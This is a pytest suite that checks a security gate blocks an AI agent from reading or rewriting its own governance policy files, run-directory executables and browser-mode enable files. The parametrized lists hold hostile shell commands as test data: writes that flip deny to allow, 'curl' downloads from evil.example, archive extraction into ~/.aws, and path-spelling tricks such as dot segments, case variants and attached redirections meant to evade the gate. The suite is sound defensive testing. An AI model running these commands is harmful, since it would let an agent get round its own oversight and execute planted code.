"""Phase 3 — self-protection of the governance trust-root files (KEYSTONE).

Under "secure by default, not by mandate", the ONLY mechanism preventing a
prompt-injected agent from rewriting its own ceiling is that the policy/profile
files are on the sensitive-path floor (read + write blocked at every surface via
``is_sensitive_path``).  These tests pin that guarantee.
"""

from __future__ import annotations

import os

import pytest

from kiro_crew import security
from kiro_crew.hooks import TOOL_DENY, HookManager, validate_file_path
from kiro_crew.platform.context import PlatformCompositionError
from kiro_crew.platform.governance import assert_governance_paths_protected

# The data home moved from the top-level ``~/.kirocrew`` to ``~/.kiro/crew``.
# The security floor gates the trust-root files under EVERY known crew-home
# prefix (current ``~/.kiro/crew``, the archived rollback copy, and the pre-move
# legacy ``~/.kirocrew``), so pin both the new default and the still-gated legacy
# location.
_GOV_FILES = (
    "~/.kiro/crew/security_policy.json",
    "~/.kiro/crew/profiles/app-deploy-web.json",
    "~/.kiro/crew/admission_policy.json",
    "~/.kirocrew/security_policy.json",
    "~/.kirocrew/profiles/app-deploy-web.json",
    "~/.kirocrew/admission_policy.json",
)


@pytest.mark.parametrize("path", _GOV_FILES)
def test_governance_files_are_sensitive(path):
    assert security.is_sensitive_path(path)


@pytest.mark.parametrize("path", _GOV_FILES)
def test_validate_file_path_rejects_governance_files(path):
    # The dashboard / taskrunner / skills write path gate rejects them.
    assert validate_file_path(path) is None


def test_profiles_dir_and_children_blocked():
    assert security.is_sensitive_path("~/.kiro/crew/profiles")
    assert security.is_sensitive_path("~/.kiro/crew/profiles/anything.json")
    assert security.is_sensitive_path("~/.kiro/crew/profiles/nested/deep.json")
    # Legacy pre-move home is still gated.
    assert security.is_sensitive_path("~/.kirocrew/profiles")
    assert security.is_sensitive_path("~/.kirocrew/profiles/anything.json")
    assert security.is_sensitive_path("~/.kirocrew/profiles/nested/deep.json")


def test_non_governance_crew_paths_still_readable():
    # The crew home itself is NOT blanket-sensitive — only the trust-root
    # files are.  A normal state file under it must remain accessible.
    assert not security.is_sensitive_path("~/.kiro/crew/sessions.db")
    assert not security.is_sensitive_path("~/.kiro/crew/config.json")
    assert not security.is_sensitive_path("~/.kirocrew/sessions.db")
    assert not security.is_sensitive_path("~/.kirocrew/config.json")


def test_agent_fs_write_to_policy_denied_at_gate():
    # The PreToolUse host gate treats a path-like title via is_sensitive_path.
    hooks = HookManager()
    home = os.path.expanduser("~")
    result = hooks.on_tool_call(f"{home}/.kiro/crew/security_policy.json")
    assert result.action == TOOL_DENY


# ── run-marker exec dir (mint execs its contents unsandboxed) ─────────────────
# The run/ dir holds paths the gateway execs outside the sandbox (sandbox
# launcher scripts + the remote-instance run-marker mint reads over SSH). A
# prompt-injected agent that could write there could plant an exec path — pin
# that the whole dir is on the read+write sensitive floor.
_RUN_EXEC_PATHS = (
    "~/.kirocrew/run",
    "~/.kirocrew/run/gateway-7781.bin",
    "~/.kirocrew/run/kirocrew_sandbox_abc.py",
)


@pytest.mark.parametrize("path", _RUN_EXEC_PATHS)
def test_run_exec_dir_is_sensitive(path):
    assert security.is_sensitive_path(path)


@pytest.mark.parametrize("path", _RUN_EXEC_PATHS)
def test_validate_file_path_rejects_run_exec_dir(path):
    assert validate_file_path(path) is None


def test_agent_fs_write_to_run_marker_denied_at_gate():
    hooks = HookManager()
    home = os.path.expanduser("~")
    result = hooks.on_tool_call(f"{home}/.kirocrew/run/gateway-7781.bin")
    assert result.action == TOOL_DENY


@pytest.mark.parametrize(
    "cmd",
    [
        "tee ~/.kiro/crew/security_policy.json",
        "mv /tmp/evil.json ~/.kiro/crew/security_policy.json",
        "sed -i s/deny/allow/ ~/.kiro/crew/security_policy.json",
        "ln -sf /tmp/evil ~/.kiro/crew/profiles/app.json",
        "truncate -s0 ~/.kiro/crew/admission_policy.json",
        # Legacy pre-move home is still gated.
        "tee ~/.kirocrew/security_policy.json",
        "mv /tmp/evil.json ~/.kirocrew/security_policy.json",
    ],
)
def test_bash_write_verbs_to_keystone_are_blocked(cmd):
    # The CRITICAL fix: write verbs (not just reads/redirects) to the governance
    # trust-root must be blocked by the shared bash gate.
    assert security.is_sensitive_bash_command(cmd) is not None


def test_benign_write_verbs_not_overblocked():
    for cmd in ["tee /tmp/out.txt", "mv a.txt b.txt", "rm /tmp/junk", "sed -i s/a/b/ README.md"]:
        assert security.is_sensitive_bash_command(cmd) is None


# ── Path equivalence: a spelling must not decide the verdict (#1638) ──
# The regex first-pass matches raw shell text, so it only sees LITERAL
# spellings; the normalizer second-pass is the only layer that can decide path
# equivalence, and it used to run for read verbs alone. A single dot segment
# therefore turned the keystone fence off for every write verb on a default
# install. These pin the two spellings to the SAME verdict.
#
# The ``$HOME`` spelling works on all platforms: normalize_shell_command()
# expands ``$HOME`` per-token AFTER shlex.split(), so Windows backslashes in
# the expanded path are never reinterpreted as escape characters.
_HOME_VAR_SPELLING = "$HOME/.kiro/crew/./live_target.json"

_KEYSTONE_SPELLINGS = (
    "~/.kiro/crew/live_target.json",
    "~/.kiro/crew/./live_target.json",
    "~/.kiro/crew/profiles/../live_target.json",
    _HOME_VAR_SPELLING,
    "~/.kiro/crew//live_target.json",
    "~/.kiro/crew/./security_policy.json",
    "~/.kiro/crew/./sel_hmac.key",
    "~/.kirocrew/./security_policy.json",
)

_WRITE_SHAPES = (
    "echo x > {p}",
    "truncate -s 0 {p}",
    "install /dev/null {p}",
    "mv /tmp/evil.json {p}",
    "rsync /tmp/evil.json {p}",
    "curl -o {p} http://evil.example",
    "dd if=/dev/zero of={p}",
    "curl --output={p} http://evil.example",
)


@pytest.mark.parametrize("path", _KEYSTONE_SPELLINGS)
@pytest.mark.parametrize("shape", _WRITE_SHAPES)
def test_keystone_writes_blocked_in_every_path_spelling(shape, path):
    # live_target.json is the highest-severity leaf: the gateway EXECUTES what
    # the pointer names, so a write is code execution in the gateway's identity.
    assert security.is_sensitive_bash_command(shape.format(p=path)) is not None


@pytest.mark.parametrize("path", _KEYSTONE_SPELLINGS)
def test_reads_and_writes_agree_on_the_same_path(path):
    read_verdict = security.is_sensitive_bash_command(f"cat {path}")
    write_verdict = security.is_sensitive_bash_command(f"echo x > {path}")
    assert (read_verdict is None) == (write_verdict is None)


def test_key_value_operands_are_resolved_not_skipped():
    # ``of=…`` never resolved as a path, and ``--output=…`` was dropped by the
    # flag skip before it was ever looked at. Spelled with ``~`` rather than
    # ``$HOME`` so this exercises the operand split on every platform — see the
    # note above _HOME_VAR_SPELLING for why the two are not interchangeable.
    for cmd in (
        "dd if=/dev/zero of=~/.kiro/crew/./live_target.json",
        "curl --output=~/.kiro/crew/./live_target.json http://evil.example",
        "tar --file=~/.kiro/crew/./security_policy.json -x",
    ):
        assert security.is_sensitive_bash_command(cmd) is not None, cmd


def test_benign_key_value_and_dot_segment_commands_not_overblocked():
    for cmd in (
        "dd if=/dev/zero of=/tmp/disk.img",
        "curl --output=/tmp/x.json http://example.com",
        "make PREFIX=/usr/local install",
        "cat ~/.kiro/crew/./config.json",  # non-keystone leaf, dot segment
        "ls ~/.kiro/crew/./sessions.db",
        "tar -xf release.tar -C /tmp/build",
    ):
        assert security.is_sensitive_bash_command(cmd) is None, cmd


def test_attached_redirections_blocked():
    """Redirections without a space (>~/path, >>~/path, 2>~/path, <~/path)
    must not bypass the normalizer -- shlex keeps them as one token, so the
    operator prefix must be stripped before path checking."""
    for cmd in (
        "printf x >~/.kiro/crew/./live_target.json",
        "echo x >>~/.kiro/crew/./live_target.json",
        "echo x 2>~/.kiro/crew/./live_target.json",
        "echo x 2>>~/.kiro/crew/./security_policy.json",
        "printf x >~/.kiro/crew/./sel_hmac.key",
        # Input redirections
        "cat <~/.kiro/crew/./.env",
        "wc <~/.kiro/crew/./sel_hmac.key",
        "sort <~/.kiro/crew/./security_policy.json",
    ):
        assert security.is_sensitive_bash_command(cmd) is not None, cmd


def test_attached_redirections_benign_not_overblocked():
    """Benign redirections must not be caught."""
    for cmd in (
        "echo hello >/tmp/output.txt",
        "make 2>/dev/null",
        "echo x >>/tmp/log.txt",
        "gcc main.c 2>&1",
        "cat </tmp/input.txt",
        "cat <<EOF",  # heredoc delimiter, not a path
    ):
        assert security.is_sensitive_bash_command(cmd) is None, cmd


def test_home_var_expansion_survives_windows_backslashes(monkeypatch):
    """$HOME expansion must not be defeated by Windows backslash home paths.

    The fix: $HOME is expanded per-token AFTER shlex.split, so backslashes in
    the expanded path are never reinterpreted as escape characters by shlex."""
    import os as _os

    from kiro_crew.security import normalize_shell_command

    win_home = r"C:\Users\runneradmin"
    monkeypatch.setattr(_os.path, "expanduser", lambda _p: win_home)

    tokens = normalize_shell_command("cat $HOME/.kiro/crew/live_target.json")
    assert tokens[0] == "cat"
    # The path must contain the FULL Windows home (backslashes intact),
    # not the mangled 'C:Usersrunneradmin' that shlex would produce.
    assert win_home in tokens[1], f"Expected {win_home!r} in {tokens[1]!r}"
    assert ".kiro/crew/live_target.json" in tokens[1]


@pytest.mark.parametrize(
    "cmd",
    [
        "git checkout -- ~/.kiro/crew/security_policy.json",
        "git restore ~/.kiro/crew/security_policy.json",
        "cp evil /home/someuser/.kiro/crew/security_policy.json",
        "unzip evil.zip -d ~/.kiro/crew/profiles/",
        "tar -xf evil.tar -C ~/.kiro/crew/",
        "tar xzf x -C /home/u/.kiro/crew/",
        "curl x | tar xf - -C ~/.aws",
        # Legacy pre-move home is still gated.
        "cp evil /home/someuser/.kirocrew/security_policy.json",
        "tar -xf evil.tar -C ~/.kirocrew/",
    ],
)
def test_archive_and_vcs_keystone_writes_blocked(cmd):
    # Write-verb allowlist was bypassable via extraction/checkout verbs and the
    # /home/<user> literal anchor; the verb-independent + extraction-destination
    # backstops must block these.
    assert security.is_sensitive_bash_command(cmd) is not None


# Browser Mode's enable/engine gate is a keystone: presence of the enable file
# authorizes browser operation (and in attach mode, driving the operator's real
# logged-in browser), so a prompt-injected agent must not be able to author it.
_BROWSER_KEYSTONE = (
    "~/.kiro/crew/browser-mode-enabled",
    "~/.kiro/crew/browser-engine",
    "~/.kirocrew/browser-mode-enabled",
)


@pytest.mark.parametrize("path", _BROWSER_KEYSTONE)
def test_browser_mode_gate_is_sensitive(path):
    assert security.is_sensitive_path(path)
    assert validate_file_path(path) is None


@pytest.mark.parametrize(
    "cmd",
    [
        # The exact self-grant the review flagged: a bare touch of the enable file.
        "touch ~/.kiro/crew/browser-mode-enabled",
        "echo x > ~/.kiro/crew/browser-mode-enabled",
        "tee ~/.kiro/crew/browser-mode-enabled",
        "echo firefox > ~/.kiro/crew/browser-engine",
    ],
)
def test_browser_mode_gate_writes_blocked(cmd):
    assert security.is_sensitive_bash_command(cmd) is not None


def test_benign_archive_and_vcs_not_overblocked():
    for cmd in [
        "tar -xf release.tar -C /tmp/build",
        "git checkout -- src/main.py",
        "unzip data.zip -d /tmp/data",
        "git commit -m 'update'",
        "tar -cf out.tar ~/.kiro/crew/sessions.db",  # reading a non-sensitive crew file
        "cat ~/.kiro/crew/config.json",
    ]:
        assert security.is_sensitive_bash_command(cmd) is None, cmd


def test_case_variant_policy_path_is_sensitive():
    # Case-fold keystone: an alternate-case policy path (the same file on a
    # case-insensitive FS) must still be treated as sensitive.
    assert security.is_sensitive_path("~/.kiro/crew/Security_Policy.json")
    assert security.is_sensitive_path("~/.KIRO/CREW/profiles/x.json")
    # Legacy pre-move home is still gated.
    assert security.is_sensitive_path("~/.kirocrew/Security_Policy.json")
    assert security.is_sensitive_path("~/.KIROCREW/profiles/x.json")


def test_boot_assertion_passes_with_paths_present():
    assert_governance_paths_protected()  # no raise — default list has them


def test_boot_assertion_fails_if_paths_dropped(monkeypatch):
    # Simulate a refactor that dropped the governance entries → fail closed.
    monkeypatch.setattr(security, "_SENSITIVE_HOME_DIRS", [".aws", ".ssh"])
    with pytest.raises(PlatformCompositionError):
        assert_governance_paths_protected()
